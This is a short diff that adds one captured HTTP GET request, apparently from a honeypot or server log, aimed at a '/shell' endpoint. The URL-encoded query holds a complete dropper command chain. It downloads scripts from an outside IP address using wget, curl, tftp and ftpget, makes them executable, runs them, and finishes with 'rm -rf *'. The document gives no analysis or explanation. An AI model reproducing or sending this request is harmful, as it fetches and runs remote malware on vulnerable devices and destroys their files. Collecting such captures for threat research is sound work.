@@ -1,0 +1,7 @@
+GET /shell?cd%20/tmp%20%7C%7C%20cd%20/var/run%20%7C%7C%20cd%20/mnt%20%7C%7C%20cd%20/root%20%7C%7C%20cd%20/;%20wget%20http://209.141.43.77/portal.sh;%20curl%20-O%20http://209.141.43.77/portal.sh;%20chmod%20777%20portal.sh;%20sh%20portal.sh;%20tftp%20209.141.43.77%20-c%20get%20portal.sh;%20chmod%20777%20portal.sh;%20sh%20portal.sh;%20tftp%20-r%20portal2.sh%20-g%20209.141.43.77;%20chmod%20777%20portal2.sh;%20sh%20portal2.sh;%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%20209.141.43.77%20portal1.sh%20portal1.sh;%20sh%20portal1.sh;%20rm%20-rf%20portal.sh%20portal.sh%20portal2.sh%20portal1.sh;%20rm%20-rf%20* HTTP/1.1
+Host: 34.121.180.85:5500
+User-Agent: python-requests/2.18.4
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
